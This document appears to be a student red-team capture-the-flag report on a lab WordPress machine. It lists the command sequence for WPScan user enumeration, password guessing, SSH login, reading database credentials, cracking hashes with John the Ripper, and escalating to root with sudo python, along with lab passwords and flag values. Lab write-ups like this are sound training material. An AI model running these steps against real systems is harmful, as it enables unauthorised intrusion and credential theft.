# Red Team Summary of Operations - Offensive Report

### Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
Netdiscover scan results for possible target machines:

Command: '$ netdiscover -r 192.168.1.90'

![Netdiscover Scan Command](/Images/Day1/netdiscover%20scan%20for%20target%20ip.JPG "Netdiscover Scan Command")

![Netdiscover Scan Results](/Images/Day1/netdiscover%20scan%20for%20target%20ip%202.JPG "Netdiscover Scan Results")

Nmap scan results for each machine reveal the below services and OS details:

Command: `$ nmap -sV 192.168.1.110`

![Nmap scan results](/Images/Day1/nmap%20scan%20of%20exposed%20ports%20and%20services%20on%20target.JPG "Nmap scan results")

This scan identifies ports and services that could potentially be used for entry:

**Target 1**
1. Port 22/TCP 	    Open 	SSH
2. Port 80/TCP 	    Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn

### Critical Vulnerabilities
The following vulnerabilities were identified on each target:

**Target 1**
1. User Enumeration (WordPress site)
2. Weak User Password
3. Unsalted User Password Hash (WordPress database)
4. Misconfiguration of User Privileges/Privilege Escalation

### Exploitation
Target 1 was successfully penetrated by the Red Team and the following confidential data was compromised:

**Target 1**
- **Flag1: b9bbcb33ellb80be759c4e844862482d**
![Flag 1](/Images/Day1/ssh%20michael%20find%20first%20flag%203.JPG "Flag 1")
- Exploit Used:
    - WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
        - `$ wpscan --url http://192.168.1.110 --enumerate u`

![WPScan](/Images/Day1/wpscan%20of%20target.JPG "WPScan")

![WPScan results](/Images/Day1/wpscan%20results.JPG "WPScan results")

- Targeting user Michael
    - Manual "Brute Force" attack to finds Michael’s password
	- Several basic and common passwords were guessed to determine Michael's password
		- Password: michael
    - User password was weak and obvious as expected
- Capturing Flag 1: SSH in as Michael traversing through directories and files.
    - Flag 1 found in var/www/html folder at root in service.html in a HTML comment below the footer.
    - Commands:
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd ../`
        - `cd ../`
        - `cd var/www/html`
        - `ls -l`
        - `nano service.html`

![SSH Michael](/Images/Day1/ssh%20michael.JPG "SSH Michael")

![SSH Michael Find Flag 1](/Images/Day1/ssh%20michael%20find%20first%20flag.JPG "SSH Michael Find Flag 1")

![SSH Michael navigating folders](/Images/Day1/ssh%20michael%20find%20first%20flag%202.JPG "SSH Michael navigating folders")

![Flag 1](/Images/Day1/ssh%20michael%20find%20first%20flag%203.JPG "Flag 1")

- **Flag2: fc3fd58dcdad9ab23faca6e9a3e581c**
- Exploit Used:
    - Same exploit used to discover Flag 1.
    - Capturing Flag 2: While using Michael's user access Flag 2 was discovered by navigating through directories and files.
        - Flag 2 was found in /var/www next to the html folder that held Flag 1.
        - Commands:
            - `ssh michael@192.168.1.110` 
            - `pw: michael`
            - `cd ../` 
            - `cd ../`
            - `cd var/www`
            - `ls -l`
            - `cat flag2.txt`

![Flag 2](/Images/Day1/flag%202.JPG "Flag 2")

![Flag 2 File cat](/Images/Day1/flag%202%20(2).JPG "Flag 2 File cat")

- **Flag3: afc01ab56b50591e7dccf93122770cd2**
- Exploit Used:
    - Same exploits used to gain Flag 1 and 2.
    - Capturing Flag 3: Accessing MySQL database.
        - While using Michael's credentials, the Red Team discovered the wp-config.php file and login credentials that grant access to a database
	- MySQL was used to explore the database.
        - Flag 3 was found in wp_posts table in the wordpress database.
        - Commands:
            - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
            - `show databases;`
            - `use wordpress;` 
            - `show tables;`
            - `select * from wp_posts;`

![MySQL login](/Images/Day1/msql%20login.JPG "MySQL login")
![Navigating in MySQL](/Images/Day1/mysql%202.JPG "Navigating MySQL")
![Flag 3 location](/Images/Day1/mysql%20flag%203.JPG "Flag 3 location")

- **Flag4: 715dea6c055b9fe3337544932f2941ce**
- Exploit Used:
    - Unsalted password hash and the use of privilege escalation with Python.
    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
        - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next. 
        - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
            - Commands:
                - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
                - `show databases;`
                - `use wordpress;` 
                - `show tables;`
                - `select * from wp_users;`

        - ![wp_users table](/Images/Day1/mysql%20users.JPG "wp_users table")

        - On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
            - Command:
                - `john wp_hashes.txt`

        - ![John the Ripper results](/Images/Day1/john%20stevens%20hashed%20password.JPG "John the Ripper results")

        - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
            - Commands: 
                - `ssh steven@192.168.1.110`
                - `pw:pink84`
                - `sudo -l`
                - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
                - `cd /root`
                - `ls`
                - `cat flag4.txt`

![ssh Steven](/Images/Day1/loggin%20in%20as%20steven%20using%20cracked%20password.JPG "ssh Steven")
![Getting root access as Steven](/Images/Day1/loggin%20in%20as%20steven%20using%20cracked%20password%20and%20getting%20root%20access.JPG "Getting root access as Steven")
![Flag 4 location](/Images/Day1/flag%204.JPG "Flag 4 location")
